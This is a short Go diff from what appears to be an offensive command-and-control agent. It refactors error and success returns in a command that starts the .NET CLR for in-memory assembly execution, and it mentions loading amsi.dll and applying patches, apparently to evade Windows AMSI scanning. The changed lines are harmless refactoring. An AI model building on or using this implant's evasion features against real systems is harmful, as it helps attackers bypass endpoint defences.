@@ -90,11 +90,7 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 			break // Non-transient error, stop retrying
 		}
 		if loadErr != nil {
-			return structs.CommandResult{
-				Output:    output + fmt.Sprintf("Error initializing CLR: %v", loadErr),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorResult(output + fmt.Sprintf("Error initializing CLR: %v", loadErr))
 		}
 		// Store in shared state so inline-assembly can reuse this runtime host
 		runtimeHost = host
@@ -215,11 +211,7 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 		output += "\n[+] CLR initialized and patches applied. Ready for assembly execution."
 	}
 
-	return structs.CommandResult{
-		Output:    output,
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(output)
 }
 
 // loadAMSI explicitly loads amsi.dll into the process
